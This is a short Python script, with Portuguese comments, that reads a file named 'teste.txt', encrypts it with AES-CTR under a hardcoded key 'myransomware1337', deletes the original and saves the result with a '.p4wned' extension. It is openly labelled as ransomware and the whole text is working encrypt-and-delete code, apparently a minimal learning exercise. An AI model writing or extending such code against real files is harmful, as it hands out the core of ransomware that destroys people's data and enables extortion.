import os
import os.path
import pyaes

try:
    file_name = "teste.txt"
    # abrindo arquivo pra leitura
    with open(file_name, 'rb') as file:
        file_data = file.read()
        file.close()
except Exception as e:
    print(e)
else:
    # criando chave criptografica
    key = b'myransomware1337'
    aes = pyaes.AESModeOfOperationCTR(key)

    # criptografando conteudo
    encrypted_data = aes.encrypt(file_data)

    # remover arquivo original
    os.remove(file_name)

    # criar arquivo criptografado
    new_file = file_name + '.p4wned'
    new_file = open(f'{new_file}', 'wb')
    new_file.write(encrypted_data)
    new_file.close()
